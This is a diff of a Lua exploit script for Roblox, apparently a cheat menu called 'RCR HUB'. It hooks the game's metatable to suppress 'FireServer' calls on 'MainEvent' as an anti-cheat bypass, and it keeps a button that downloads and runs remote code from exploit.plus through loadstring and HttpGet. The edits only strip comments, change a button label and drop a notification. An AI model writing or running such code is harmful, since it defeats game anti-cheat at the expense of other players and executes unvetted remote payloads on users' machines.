@@ -21,7 +21,6 @@ MainTab:CreateSection("Bypass")
 MainTab:CreateButton({
    Name = "Universal AC Bypass",
    Callback = function()
-       -- Basic Universal Anti-Cheat Bypass
        local gmt = getrawmetatable(game)
        setreadonly(gmt, false)
        local old = gmt.__namecall
@@ -29,7 +28,7 @@ MainTab:CreateButton({
        gmt.__namecall = newcclosure(function(self, ...)
            local method = getnamecallmethod()
            if method == "FireServer" and self.Name == "MainEvent" then
-               return -- Blocks common anti-cheat detection signals
+               return 
            end
            return old(self, ...)
        end)
@@ -65,7 +64,7 @@ MainTab:CreateButton({
 })
 
 MainTab:CreateButton({
-   Name = "MODERN",
+   Name = "MODERN (click ctrl to open)",
    Callback = function()
        loadstring(game:HttpGet('https://exploit.plus/Loader'))()
    end,
@@ -144,10 +143,4 @@ VisualTab:CreateButton({
        lighting.FogEnd = 100000
        lighting.GlobalShadows = false
    end,
-})
-
-Rayfield:Notify({
-   Title = "RCR HUB",
-   Content = "Ready with AC Bypass",
-   Duration = 5,
 })
